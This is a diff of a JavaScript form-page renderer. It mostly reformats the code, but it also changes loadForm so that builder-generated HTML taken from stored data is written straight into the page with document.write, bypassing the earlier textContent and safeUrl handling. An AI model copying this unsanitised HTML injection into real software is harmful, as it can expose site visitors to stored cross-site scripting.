-    const div =
-      document.createElement("div");
+      const div =
+        document.createElement(
+          "div"
+        );
 
-    div.className =
-      "embedLink";
+      div.className =
+        "embedLink";
 
-    if (link.text) {
+      if (link.text) {
 
-      const strong =
-        document.createElement("strong");
+        const strong =
+          document.createElement(
+            "strong"
+          );
 
-      strong.textContent =
-        link.text;
+        strong.textContent =
+          link.text;
 
-      div.appendChild(strong);
-      div.appendChild(
-        document.createElement("br")
+        div.appendChild(
+          strong
+        );
+
+        div.appendChild(
+          document.createElement(
+            "br"
+          )
+        );
+      }
+
+      const url =
+        safeUrl(link.url);
+
+      if (url) {
+
+        const a =
+          document.createElement(
+            "a"
+          );
+
+        a.href =
+          url;
+
+        a.target =
+          "_blank";
+
+        a.rel =
+          "noopener noreferrer";
+
+        a.textContent =
+          link.url;
+
+        div.appendChild(
+          a
+        );
+      }
+
+      if (link.desc) {
+
+        const small =
+          document.createElement(
+            "small"
+          );
+
+        small.textContent =
+          link.desc;
+
+        div.appendChild(
+          document.createElement(
+            "br"
+          )
+        );
+
+        div.appendChild(
+          small
+        );
+      }
+
+      container.appendChild(
+        div
       );
     }
-
-    const url =
-      safeUrl(link.url);
-
-    if (url) {
-
-      const a =
-        document.createElement("a");
-
-      a.href = url;
-      a.target = "_blank";
-      a.rel = "noopener noreferrer";
-
-      a.textContent =
-        link.url;
-
-      div.appendChild(a);
-    }
-
-    if (link.desc) {
-
-      const small =
-        document.createElement("small");
-
-      small.textContent =
-        link.desc;
-
-      div.appendChild(
-        document.createElement("br")
-      );
-
-      div.appendChild(small);
-    }
-
-    container.appendChild(div);
-  });
+  );
 }
 
 /* =====================================================
    ADS
 ===================================================== */
 
-function renderAds(data, container) {
+function renderAds(
+  data,
+  container
+) {
 
   if (!data.enableAds) {
     return;
   }
 
   const ad =
-    document.createElement("div");
+    document.createElement(
+      "div"
+    );
 
   ad.className =
     "ad-box";
 
   const strong =
-    document.createElement("strong");
+    document.createElement(
+      "strong"
+    );
 
   strong.textContent =
     "Sponsored";
 
   const text =
-    document.createElement("div");
+    document.createElement(
+      "div"
+    );
 
   text.textContent =
-    data.adText || "";
+    data.adText ||
+    "";
 
-  ad.appendChild(strong);
   ad.appendChild(
-    document.createElement("br")
+    strong
   );
-  ad.appendChild(text);
 
-  container.appendChild(ad);
+  ad.appendChild(
+    document.createElement(
+      "br"
+    )
+  );
+
+  ad.appendChild(
+    text
+  );
+
+  container.appendChild(
+    ad
+  );
 }
 
 /* =====================================================
    EXTRA BUTTONS
 ===================================================== */
 
-function renderExtraButtons(data, root) {
+function renderExtraButtons(
+  data,
+  root
+) {
 
   if (
     !Array.isArray(data.extraButtons)
@@ -1674,94 +2199,113 @@ function renderExtraButtons(data, root) {
     return;
   }
 
-  data.extraButtons.forEach(buttonData => {
+  data.extraButtons.forEach(
+    buttonData => {
 
-    if (
-      !buttonData ||
-      buttonData.show === false
-    ) {
-      return;
-    }
-
-    const button =
-      document.createElement("button");
-
-    button.className =
-      "draggableBtn";
-
-    button.type =
-      "button";
-
-    button.textContent =
-      buttonData.text ||
-      "Button";
-
-    button.style.background =
-      buttonData.color ||
-      "#1976d2";
-
-    const size =
-      Number(buttonData.size);
-
-    if (size > 0) {
-
-      button.style.width =
-        size + "px";
-
-      button.style.height =
-        size + "px";
-    }
-
-    if (
-      buttonData.x !== undefined
-    ) {
-
-      button.style.left =
-        Number(buttonData.x) + "%";
-    }
-
-    if (
-      buttonData.y !== undefined
-    ) {
-
-      button.style.top =
-        Number(buttonData.y) + "%";
-    }
-
-    button.addEventListener(
-      "click",
-      function() {
-
-        const url =
-          safeUrl(buttonData.link);
-
-        if (url) {
-
-          window.open(
-            url,
-            "_blank",
-            "noopener,noreferrer"
-          );
-        }
+      if (
+        !buttonData ||
+        buttonData.show === false
+      ) {
+        return;
       }
-    );
 
-    root.appendChild(button);
-  });
+      const button =
+        document.createElement(
+          "button"
+        );
+
+      button.className =
+        "draggableBtn";
+
+      button.type =
+        "button";
+
+      button.textContent =
+        buttonData.text ||
+        "Button";
+
+      button.style.background =
+        buttonData.color ||
+        "#1976d2";
+
+      const size =
+        Number(
+          buttonData.size
+        );
+
+      if (size > 0) {
+
+        button.style.width =
+          size + "px";
+
+        button.style.height =
+          size + "px";
+      }
+
+      if (
+        buttonData.x !== undefined
+      ) {
+
+        button.style.left =
+          Number(
+            buttonData.x
+          ) + "%";
+      }
+
+      if (
+        buttonData.y !== undefined
+      ) {
+
+        button.style.top =
+          Number(
+            buttonData.y
+          ) + "%";
+      }
+
+      button.addEventListener(
+        "click",
+        function() {
+
+          const url =
+            safeUrl(
+              buttonData.link
+            );
+
+          if (url) {
+
+            window.open(
+              url,
+              "_blank",
+              "noopener,noreferrer"
+            );
+          }
+        }
+      );
+
+      root.appendChild(
+        button
+      );
+    }
+  );
 }
 
 /* =====================================================
    FOOTER
 ===================================================== */
 
-function renderFooter(data, container) {
+function renderFooter(
+  data,
+  container
+) {
 
   if (!data.footerText) {
     return;
   }
 
   const footer =
-    document.createElement("footer");
+    document.createElement(
+      "footer"
+    );
 
   footer.className =
     "page-footer";
@@ -1769,17 +2313,21 @@ function renderFooter(data, container) {
   footer.textContent =
     data.footerText;
 
-  container.appendChild(footer);
+  container.appendChild(
+    footer
+  );
 }
 
 /* =====================================================
-   MAIN RENDERER
+   FALLBACK RENDERER
 ===================================================== */
 
 function renderForm(rawData) {
 
   const data =
-    normalizeData(rawData);
+    normalizeData(
+      rawData
+    );
 
   const root =
     document.getElementById(
@@ -1791,7 +2339,8 @@ function renderForm(rawData) {
       "contentLayer"
     );
 
-  content.innerHTML = "";
+  content.innerHTML =
+    "";
 
   root.style.color =
     data.textColor ||
@@ -1828,7 +2377,9 @@ function renderForm(rawData) {
   );
 
   const formContainer =
-    document.createElement("div");
+    document.createElement(
+      "div"
+    );
 
   formContainer.className =
     "form-container";
@@ -1864,7 +2415,7 @@ function renderForm(rawData) {
 }
 
 /* =====================================================
-   LOAD FORM FROM FIRESTORE
+   LOAD FORM
 ===================================================== */
 
 async function loadForm() {
@@ -1906,9 +2457,52 @@ async function loadForm() {
       data
     );
 
-    updateSEO(data);
+    /* =================================================
+       IMPORTANT:
+       USE COMPLETE GENERATED HTML
+       ================================================= */
 
-    renderForm(data);
+    if (
+      data.htmlContent &&
+      typeof data.htmlContent === "string" &&
+      data.htmlContent.trim() !== ""
+    ) {
+
+      console.log(
+        "Complete generated HTML found."
+      );
+
+      /*
+       * Replace the current document with
+       * exactly what the builder generated.
+       */
+
+      document.open();
+
+      document.write(
+        data.htmlContent
+      );
+
+      document.close();
+
+      return;
+    }
+
+    /* =================================================
+       FALLBACK FOR OLD FORMS
+       ================================================= */
+
+    console.log(
+      "No htmlContent found. Using fallback renderer."
+    );
+
+    updateSEO(
+      data
+    );
+
+    renderForm(
+      data
+    );
 
   } catch (error) {
 
